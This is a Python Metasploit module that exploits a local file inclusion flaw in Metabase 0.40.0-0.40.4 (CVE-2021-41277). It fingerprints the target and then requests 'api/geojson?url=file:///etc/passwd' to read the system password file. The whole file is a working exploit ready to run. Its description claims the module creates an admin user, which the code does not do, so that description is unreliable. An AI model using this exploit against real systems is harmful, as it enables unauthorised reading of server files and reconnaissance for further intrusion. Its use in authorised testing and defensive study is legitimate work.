#!/usr/bin/env python3

# standard modules
from metasploit import module

# extra modules
dependencies_missing = False
try:
    import requests
    from urllib3.exceptions import ProtocolError
except ImportError:
    dependencies_missing = True

metadata = {
    'name': 'Metabase 0.40.0 - 0.40.4 Local File Inclusion',
    'description': '''
        This module creates an amin user by making use of Metabase 0.40.0 - 0.40.4 local file inclusion.
    ''',
    'authors': [
        'amylin',
    ],
    'date': '2022-03-09',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'cve', 'ref': '2021-41277'},
    ],
    'type': 'single_scanner',
    'options': {
        'RPORT': {'type': 'int', 'description': 'Target port', 'required': True, 'default': 80},
        'TARGETURI': {'type': 'string', 'description': 'The base path', 'required': True, 'default': '/'},
    }
}


def find_base_url(args):
    base_url = f"http://{args['rhost']}:{args['RPORT']}{args['TARGETURI']}"
    try:
        result = requests.get(base_url, timeout=3)
    except ProtocolError:
        base_url = f"https://{args['rhost']}:{args['RPORT']}{args['TARGETURI']}"
        result = requests.get(base_url, timeout=3)
    return base_url


def check_valid_url(url):
    res = requests.get(url, timeout = 3)
    if res and 'metabase' in res.text:
        return True
    else:
        return False


def get_file(base_url, query):
    res = requests.get(f'{base_url}{query}', timeout = 3)
    if res and res.status_code == 200:
        return True
    else:
        return False


def run(args):
    try:
        # dependency check
        if dependencies_missing:
            module.log('Module dependency (requests) is missing, cannot continue', level='error')
            return

        # check
        base_url = find_base_url(args)
        if check_valid_url(base_url):
            module.log('Target is valid', level='good')
        else:
            module.log('It seems that this is not a website provided by metabase.', level='warning')
            return

        query = 'api/geojson?url=file:///etc/passwd'
        if get_file(base_url, query):
            module.log('Successfully get /etc/passwd file', level='good')
        else:
            module.log('Failed to get /etc/passwd file', level='error')

    except Exception as e:
        module.log(str(e), level='error')


if __name__ == '__main__':
    module.run(metadata, run)
